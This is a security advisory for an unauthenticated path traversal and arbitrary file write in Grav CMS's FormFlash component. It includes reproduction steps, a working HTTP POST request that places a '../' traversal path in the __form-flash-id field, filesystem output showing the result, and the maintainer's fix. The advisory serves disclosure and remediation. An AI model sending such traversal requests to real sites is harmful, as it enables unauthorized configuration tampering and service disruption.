# [H] Grav has Unauthenticated Path Traversal & Arbitrary File Write in its FormFlash component

## Summary
Severity: High
Advisory: GHSA-hmcx-ch82-3fv2
CVE: CVE-2026-42608
CWE: CWE-22
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-hmcx-ch82-3fv2
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <2.0.0-beta.2

## Details
# Vulnerability Report: Grav CMS Unauthenticated Path Traversal & Arbitrary File Write

**[ZERO-DAY] Unauthenticated Path Traversal leading to Arbitrary Directory Creation and Configuration Injection**

## Summary

Grav CMS (v1.7.49.5 and latest development source) is vulnerable to a Zero-Day Path Traversal vulnerability within the FormFlash core component. By manipulating the session_id (passed as `__form-flash-id` in POST requests), an unauthenticated attacker can traverse the filesystem to create arbitrary directories and write an `index.yaml` file containing attacker-controlled data.

This vulnerability can lead to unauthorized modification of application behavior, potential data integrity issues, and service disruption in production environments.

## Affected Component

- Versions: Confirmed in Grav v1.7.49.5 (latest stable) and the latest development source (March 2026).
- Class: `Grav\Framework\Form\FormFlash`
- Method: `__construct()` / `getTmpDir()`
- Parameter: `session_id` (Mapped to `__form-flash-id` in POST requests)

## Vulnerability Details

The FormFlash class is used to persist form data across redirects. It constructs a temporary storage path using the provided session_id. The path construction logic in the latest source:

```php
$folder = $config['folder'] ?? ($this->sessionId ? 'tmp://forms/' . $this->sessionId : '');
$this->folder = $folder && $locator->isStream($folder) ? $locator->findResource($folder, true, true) : $folder;
```

Lack of sanitization on the sessionId (the raw session identifier) allows the use of `../` sequences. When `findResource` resolves the stream, it allows escape into any writable directory within the webserver's scope (typically `user/config/`, `cache/`, `logs/`, and `tmp/`).

## Affected Versions & Zero-Day Status

- Tested Version: v1.7.49.5 (Latest Stable Release as of Nov 2025).
- Development Branch Status: Vulnerable. The latest source code in the GitHub develop branch (March 2026) remains unpatched.
- Affected Range: All Grav CMS versions utilizing the FormFlash component (v1.7.x and potentially older v1.6.x versions).
- CVE Status: Zero-Day (Non-Registered). Extensive research confirmed no existing CVE addresses this specific core FormFlash session-based traversal.

## Steps to Reproduce

1. Identify any page containing a Grav Form (e.g., `/contact`).
2. Intercept the POST request during form submission.
3. Modify the `__form-flash-id` parameter to include a traversal sequence targeting a writable directory (e.g., `../../user/config/proof_dir`).
4. Submit the request.
5. Observe that a new directory (`poc/`) and file (`index.yaml`) have been created at the traversed path.

## Request Example

```http
POST /contact HTTP/1.1
Host: target.grav.cms
Content-Type: application/x-www-form-urlencoded

__form-name-=contact&__form-flash-id=../../user/config/proof_dir&form-data[name]=Attack&form-data[message]=Payload
```

## Response / Result

- HTTP/1.1 302 Found (Standard redirect)
- Filesystem Modification:
  - Directory Created: `/var/www/html/user/config/proof_dir/poc/`
  - File Created: `/var/www/html/user/config/proof_dir/poc/index.yaml`

## Proof of Concept Evidence (Before/After)

### Before Exploitation

- Status: Directory does not exist.
- Evidence:

```bash
$ ls -la /var/www/html/user/config/proof_dir/
ls: cannot access '/var/www/html/user/config/proof_dir/': No such file or directory
```

### After Exploitation

- Status: Arbitrary directory and `index.yaml` created.
- Evidence:

```bash
$ ls -la /var/www/html/user/config/proof_dir/poc/index.yaml
-rw-rw-r-- 1 www-data www-data 158 Mar 23 22:15 /var/www/html/user/config/proof_dir/poc/index.yaml
$ cat /var/www/html/user/config/proof_dir/poc/index.yaml
form: ''
id: ''
unique_id: poc
...
data:
  poc_status: confirmed
```

## Impact

- Clarified Cross-User Attack: By controlling the session identifier, an attacker can overwrite or interfere with other users temporary form data, breaking session isolation.
- Configuration Injection: Writing `index.yaml` into plugin/theme configuration subdirectories can alter application behavior or inject malicious settings.
- Data Integrity: Unauthorized modification of configuration subfolders can lead to widespread site corruption or logical bypasses.
- Denial of Service (DoS): Recursive directory creation enables attackers to exhaust disk space or inodes (inode exhaustion).

## Attack Requirements

- Authentication: None (Unauthenticated)
- Configuration: Standard Grav installation with at least one form-enabled page (e.g., Contact, Login, Registration)

## Exploitability Assessment

- Complexity: Low. Requires only basic HTTP POST parameters.
- Reliability: 100% (Deterministically reproducible in vulnerable versions).
- Severity: Critical / High. The vulnerability requires no authentication and allows filesystem manipulation and session data corruption.

## Remediation

1. Sanitize Session IDs: Apply `basename()` or a strict alphanumeric regex to the `session_id` in FormFlash before path construction.
2. Filesystem Hardening: Ensure `user/config/` and other sensitive directories have restrictive permissions preventing the webserver from creating new subdirectories.
3. Update Grav: Monitor for patches addressing FormFlash sanitization.

---

## Maintainer note — fix applied (2026-04-24)

Fixed in Grav core on the `2.0` branch: commit [`d904efc33`](https://github.com/getgrav/grav/commit/d904efc33) — will ship in **2.0.0-beta.2**.

**What changed:** `FormFlash::__construct()` now sanitizes `session_id`, `unique_id`, and `id` through a strict `[A-Za-z0-9,_-]{1,64}` allowlist before any path is constructed from them. Invalid values collapse to `''`, which causes `save()`/`delete()`/`getTmpDir()` to no-op — so a `__form-flash-id=../../user/config/proof_dir` POST simply does nothing on disk.

**Files:**

- [`system/src/Grav/Framework/Form/FormFlash.php`](https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Framework/Form/FormFlash.php)
- [`tests/unit/Grav/Common/Security/FormFlashSecurityTest.php`](https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/FormFlashSecurityTest.php) — 32 test cases covering the PoC + variants.

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-hmcx-ch82-3fv2
- https://nvd.nist.gov/vuln/detail/CVE-2026-42608
- https://github.com/getgrav/grav/commit/c66dfeb5ff679a1667678c6335eb9ff3255dfc47
- https://github.com/getgrav/grav/commit/d904efc33e03ebb597afde8d3368b28cf0423632
- https://github.com/getgrav/grav
